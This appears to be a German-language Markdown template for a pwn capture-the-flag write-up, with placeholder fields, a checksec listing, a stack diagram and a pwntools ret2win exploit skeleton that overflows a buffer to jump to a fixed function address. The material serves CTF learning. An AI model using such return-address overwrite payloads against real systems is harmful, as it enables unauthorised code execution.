# Challenge Name

**Kategorie:** pwn  
**Schwierigkeit:** Easy / Medium / Hard  
**Punkte:** ???  
**Status:** 🔄 In Progress / ✅ Gelöst  

---

## 📋 Beschreibung

> Beschreibung der Challenge hier einfügen.

**Dateien:** `binary`, `libc.so.6`  
**Server:** `nc host port`

---

## 🔍 Analyse

### Checksec
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
```

### Vulnerability
- [ ] Buffer Overflow
- [ ] Heap Overflow
- [ ] Format String
- [ ] Use After Free
- [ ] Other: ___

### Stack Layout
```
┌──────────────────┐
│  return address  │  +40
├──────────────────┤
│  saved RBP       │  +32
├──────────────────┤
│  buf[0..31]      │  +0
└──────────────────┘
```

---

## 💡 Lösung

### Schritt 1 — Analyse
...

### Schritt 2 — Exploit entwickeln
...

### Schritt 3 — Flag holen
...

---

## 🧪 Exploit

```python
#!/usr/bin/env python3
from pwn import *

# Setup
elf = ELF('./binary')
# libc = ELF('./libc.so.6')

# p = process('./binary')
p = remote('host', port)

# Payload
padding  = b'A' * 40
win_addr = p64(0x401256)

payload = padding + win_addr

p.sendline(payload)
p.interactive()
```

---

## 🏁 Flag

```
picoCTF{...}
```

---

## 📝 Learnings

- Was habe ich gelernt?
- Welche Tools waren nützlich?
- Was würde ich nächstes Mal anders machen?
